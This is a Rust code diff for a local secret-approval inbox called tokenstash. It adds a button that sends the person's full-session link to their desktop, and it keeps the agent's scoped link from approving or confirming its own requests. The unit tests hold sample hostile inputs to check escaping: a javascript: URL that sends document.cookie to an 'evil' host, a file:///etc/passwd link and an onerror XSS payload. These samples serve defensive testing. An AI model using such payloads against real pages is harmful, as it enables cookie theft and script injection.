@@ -268,20 +268,27 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
         },
         _ => return not_found(req),
     };
+    // A card the agent's link cannot complete: an approval, a paste other directories would
+    // receive, or an action card. Its scoped page offers to send the person the full link.
+    let needs_full = task.kind == TaskKind::Approval || tokenstash_core::actions::Action::of(&task).is_some() || (task.kind == TaskKind::Secret && tasks::fans_out(&app.ctx(), &task)?);
     if method == "GET" {
-        return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, q.get("m").map(String::as_str), session_token, &scope, &app.cfg.env_file));
+        return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, q.get("m").map(String::as_str), session_token, &scope, &app.cfg.env_file, needs_full));
     }
     if method == "POST" {
         let action = form.get("action").cloned().unwrap_or_default();
         let ctx = app.ctx();
         let msg: Result<String> = (|| {
             match (task.kind.clone(), action.as_str()) {
+                // The person opened the agent's link, and deciding needs their own session:
+                // send it to them the one way the agent cannot read, the desktop. Anyone with
+                // the link can press this; all it does is notify the person again.
+                (_, "notify") => send_full_link(app, &task),
                 (kind, "deny") => {
                     // An approval card is the human's decision either way: closing it from
                     // the agent's link would let the agent bury its own pairing card for a
                     // day, or another agent's in the same directory.
                     if kind == TaskKind::Approval && scope != Scope::Full {
-                        anyhow::bail!("closing an approval card needs the full inbox: click the desktop notification or run `tokenstash open`, and decide on this card there (this link stays limited to what it can do)");
+                        anyhow::bail!("closing an approval card needs your own inbox link: use the one in the desktop notification (the button below sends it again) and decide on this card there");
                     }
                     tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
                     Ok(format!("Denied {}", task.title))
@@ -312,7 +319,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
                     // human's yes to "this project may use my key", and the agent's link
                     // must not be able to give it. Refuse with no state change.
                     if scope != Scope::Full {
-                        anyhow::bail!("approving needs the full inbox: click the desktop notification or run `tokenstash open`, and approve this card there (this link stays limited to what it can do)");
+                        anyhow::bail!("approving needs your own inbox link: use the one in the desktop notification (the button below sends it again) and approve this card there");
                     }
                     let decision = match action.as_str() { "allow" => tasks::Decision::Allow, "allow_broad" => tasks::Decision::AllowBroad, _ => tasks::Decision::Deny };
                     // What the page listed when it was rendered: a card that grew since
@@ -325,15 +332,49 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
                         _ => Ok("Denied".into()),
                     }
                 }
-                (TaskKind::Human, _) => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
+                (TaskKind::Human, _) => match tokenstash_core::actions::Action::of(&task) {
+                    // An agent asked for this; confirming carries it out, so it takes the
+                    // person's own session, like approving.
+                    Some(act) => {
+                        if scope != Scope::Full {
+                            anyhow::bail!("confirming needs your own inbox link: use the one in the desktop notification (the button below sends it again) and confirm this card there");
+                        }
+                        let done = crate::cmd::actions::perform(app, &task, &act)?;
+                        tasks::answer_human(&ctx, &task, Some(&done))?;
+                        Ok(done)
+                    }
+                    None => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
+                },
             }
         })();
         return match msg {
             Ok(m) => redirect(req, &format!("{home}?m={}", urlencoding::encode(&m))),
-            Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), None, session_token, &scope, &app.cfg.env_file)),
+            Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), None, session_token, &scope, &app.cfg.env_file, needs_full)),
         };
     }
     not_found(req)
+}
+
+/// How often one card may send its full link to the desktop. Pressing the button again is
+/// the person not finding the first notification, not a reason to stack ten of them.
+const RESEND_EVERY: Duration = Duration::from_secs(30);
+
+/// Send the person a desktop notification carrying this card's full-session link: from it
+/// they can approve, confirm or paste where the agent's link cannot. The session reaches only
+/// the desktop, never the page that asked, so an agent pressing the button learns nothing.
+fn send_full_link(app: &App, task: &Task) -> Result<String> {
+    static SENT: Mutex<Option<HashMap<String, Instant>>> = Mutex::new(None);
+    let mut sent = SENT.lock().unwrap_or_else(|p| p.into_inner());
+    let sent = sent.get_or_insert_with(HashMap::new);
+    if sent.get(&task.id).is_some_and(|at| at.elapsed() < RESEND_EVERY) {
+        return Ok("Sent a moment ago: look for the tokenstash notification on this computer's desktop".into());
+    }
+    let link = crate::util::inbox_url_human(&app.cfg, Some(&task.id), crate::notify::Inbox::Ours);
+    if !crate::notify::desktop(&app.cfg, &task.title, &format!("{} · open this to decide", tokenstash_core::project::short(std::path::Path::new(&task.project))), &link) {
+        anyhow::bail!("{}", if app.cfg.notifications { "this computer could not show a desktop notification (no desktop session here, as on a server or over SSH)" } else { "desktop notifications are turned off (notifications = false in config.toml)" });
+    }
+    sent.insert(task.id.clone(), Instant::now());
+    Ok("Sent: click the tokenstash notification on this computer's desktop to decide on this card".into())
 }
 
 /// Which family a path belongs to. Anything else is nothing.
@@ -428,7 +469,7 @@ fn respond(req: Request, code: u16, ctype: &str, body: String) -> Result<()> {
 /// which card, if any, the link named. Still a 404: to a script it is as closed as the
 /// bare one, and `/verify` already tells any local process that an inbox is here.
 fn page_stale_link(req: Request) -> Result<()> {
-    let body = "<div class=err>This link is no longer valid.</div><p>Inbox links stop working when the inbox restarts, and a card's link opens that card only. To continue, click the newest desktop notification, or run <code>tokenstash open</code> in a terminal and use the link it prints.</p><p class=mut>If you did not expect this page, close it: a link that has expired cannot be used to answer anything.</p>";
+    let body = "<div class=err>This link is no longer valid.</div><p>Inbox links stop working when the inbox restarts, and a card's link opens that card only. To continue, click the newest tokenstash desktop notification, or open the card from the link your agent gave you and press <em>Send the link to my desktop</em>.</p><p class=mut>If you did not expect this page, close it: a link that has expired cannot be used to answer anything.</p>";
     respond(req, 404, "text/html; charset=utf-8", layout("Link expired", body.into()))
 }
 
@@ -838,14 +879,18 @@ fn csrf_field(token: &str) -> String {
     format!("<input type=hidden name=t value=\"{}\">", esc(token))
 }
 
-fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scope: &inbox_auth::Scope, env_file: &str) -> String {
+/// `needs_full`: deciding on this card takes the person's own session (an approval, a paste
+/// other directories receive, an action an agent asked for), so the scoped page offers to send
+/// it to their desktop.
+fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scope: &inbox_auth::Scope, env_file: &str, needs_full: bool) -> String {
     let csrf = csrf_field(token);
     let mut b = String::new();
+    let scoped = *scope != inbox_auth::Scope::Full;
     // A scoped page is one card and nothing around it: no index to go back to.
-    if *scope == inbox_auth::Scope::Full {
-        b.push_str("<p><a href='/'>← all tasks</a></p>");
+    if scoped {
+        b.push_str("<p class=mut>This link opens this one card. Every waiting card is in the inbox you open from a tokenstash desktop notification.</p>");
     } else {
-        b.push_str("<p class=mut>This link opens this one card. For every task, click the desktop notification or run <code>tokenstash open</code>.</p>");
+        b.push_str("<p><a href='/'>← all tasks</a></p>");
     }
     if let Some(f) = flash {
         b.push_str(&format!("<div class=flash>✓ {}</div>", esc(f)));
@@ -874,8 +919,16 @@ fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scop
         b.push_str(&format!("<p class=mut>This task is {}.</p></div>", t.status.as_str()));
         return layout(&t.title, b);
     }
+    // The way from the agent's link to a decision, without a terminal: the person's own link
+    // arrives as a desktop notification on the machine running this inbox.
+    let resend = if scoped && needs_full {
+        format!("<form method=post>{csrf}<div class=row><button class=p name=action value=notify>Send the link to my desktop</button></div></form><p class=mut>Deciding on this card takes your own inbox link, which tokenstash sends only to this computer's desktop, so the agent that asked can never answer it. If no notification appears, this computer has no desktop session; open the inbox on it directly.</p>")
+    } else {
+        String::new()
+    };
     match t.kind {
         TaskKind::Secret => {
+            b.push_str(&resend);
             b.push_str(&format!(
                 "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown to the agent'>{}<div class=mut style='margin-top:8px'>What happens to it: {} then it is stored in your keychain and written to <code>{}</code> in the requesting directory{}. The agent reads that file; it never sees the value in chat.</div><label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
                 esc(&t.name.clone().unwrap_or_default()),
@@ -904,7 +957,22 @@ fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scop
                 let seen = esc(&t.names.join(","));
                 b.push_str(&format!("<form method=post>{csrf}<input type=hidden name=seen value='{seen}'><div class=row><button class=p name=action value=allow>Allow these</button>{broad}<button class=bad name=action value=deny>Deny</button></div></form>"));
             } else {
-                b.push_str("<div class=err>Approving needs the full inbox session, which only you can open: click the desktop notification, or run <code>tokenstash open</code> in a terminal, and select this card there. This page stays limited to what the link can do, even if you are logged in elsewhere. (The link your agent gave you can paste keys, but not approve — so an agent can never approve its own request.)</div>");
+                b.push_str("<div class=err>Approving takes your own inbox link. The link your agent gave you can paste keys but not approve, so an agent can never approve its own request.</div>");
+                b.push_str(&resend);
+            }
+        }
+        TaskKind::Human if tokenstash_core::actions::Action::of(t).is_some() => {
+            let act = tokenstash_core::actions::Action::of(t).expect("checked above");
+            b.push_str(&format!("<p><strong>If you confirm:</strong> {}</p>", esc(&act.effect())));
+            if !act.machine_wide() {
+                b.push_str(&format!("<p class=mut>Project: <code>{}</code></p>", esc(&t.project)));
+            }
+            if scoped {
+                b.push_str("<div class=err>Confirming takes your own inbox link, so the agent that asked can never confirm its own request.</div>");
+                b.push_str(&resend);
+                b.push_str(&format!("<form method=post>{csrf}<div class=row><button class=bad name=action value=deny>Decline</button></div></form>"));
+            } else {
+                b.push_str(&format!("<form method=post>{csrf}<div class=row><button class=p name=action value=done>Confirm</button><button class=bad name=action value=deny>Decline</button></div></form>"));
             }
         }
         TaskKind::Human => {
@@ -951,13 +1019,13 @@ mod tests {
     #[test]
     fn a_card_link_is_rendered_only_for_http_schemes() {
         for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
-            let page = page_task(&card(Some(bad), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
+            let page = page_task(&card(Some(bad), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
             assert!(!page.contains("href='javascript"), "{bad}: {page}");
             assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
             assert!(!page.contains("data:text/html"), "{bad}");
             assert!(!page.contains("Open "), "no link button at all for {bad}");
         }
-        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
+        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
         assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
         assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
     }
@@ -965,7 +1033,7 @@ mod tests {
     /// Agent-written text is escaped wherever it lands on the page.
     #[test]
     fn agent_written_card_text_cannot_become_markup() {
-        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
+        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
         assert!(!page.contains("<img src=x"), "{page}");
         assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
     }
@@ -1007,21 +1075,53 @@ mod tests {
     /// that both the answer and the decline reason are returned to the agent.
     #[test]
     fn the_cards_say_what_happens_to_what_is_typed() {
-        let page = page_task(&card(None, "why"), None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local");
+        let page = page_task(&card(None, "why"), None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", false);
         assert!(page.contains("one authenticated request goes to the provider"), "OPENAI_API_KEY has a registry check: {page}");
         assert!(page.contains("written to <code>.env.local</code>"), "{page}");
         assert!(!page.contains("never sent anywhere"), "the old absolute claim is gone: {page}");
         let mut replace = card(None, "why");
         replace.expects = tasks::EXPECTS_REPLACE.into();
-        assert!(page_task(&replace, None, None, "tok", &inbox_auth::Scope::Full, ".env.local").contains("every other directory you granted this key"));
+        assert!(page_task(&replace, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false).contains("every other directory you granted this key"));
         let mut human = card(None, "why");
         human.kind = TaskKind::Human;
         human.expects = "confirm".into();
-        let page = page_task(&human, None, None, "tok", &inbox_auth::Scope::Full, ".env.local");
+        let page = page_task(&human, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
         let warn = page.find("returned to the agent word for word").expect("the warning is on the page");
         let field = page.find("name=note").expect("the note field is on the page");
         assert!(warn < field, "the warning comes before the field: {page}");
         assert!(page.contains("as the reason if you press Can't do this"), "{page}");
+    }
+
+    /// An action card an agent filed: the full session confirms it; the agent's own link shows
+    /// what confirming does, can decline, and offers to send the person their link instead of
+    /// a Confirm button.
+    #[test]
+    fn an_action_card_is_confirmed_only_with_the_persons_own_link() {
+        let mut t = card(None, "the user asked to clean up old keys");
+        t.kind = TaskKind::Human;
+        t.expects = "action:forget".into();
+        t.names = vec!["OPENAI_API_KEY@default".into()];
+        t.title = "Forget OPENAI_API_KEY".into();
+        let full = page_task(&t, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", true);
+        assert!(full.contains("If you confirm:") && full.contains("is deleted from your stash") && full.contains("value=done>Confirm"), "{full}");
+        assert!(!full.contains("value=notify"), "the person's own page needs no link sent: {full}");
+        let scoped = page_task(&t, None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", true);
+        assert!(scoped.contains("value=notify") && scoped.contains("value=deny") && !scoped.contains("value=done"), "{scoped}");
+        assert!(!scoped.contains("tokenstash open"), "no terminal step on the agent's link: {scoped}");
+    }
+
+    /// An approval opened from the agent's link cannot be approved there; the page sends the
+    /// person their own link instead of telling them to open a terminal.
+    #[test]
+    fn a_scoped_approval_offers_to_send_the_link() {
+        let mut t = card(None, "why");
+        t.kind = TaskKind::Approval;
+        t.expects = tasks::APPROVAL_PAIRING.into();
+        t.names = vec!["OPENAI_API_KEY@default".into()];
+        let scoped = page_task(&t, None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", true);
+        assert!(scoped.contains("value=notify") && !scoped.contains("value=allow") && !scoped.contains("tokenstash open"), "{scoped}");
+        let full = page_task(&t, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", true);
+        assert!(full.contains("value=allow") && !full.contains("value=notify"), "{full}");
     }
 
     #[test]
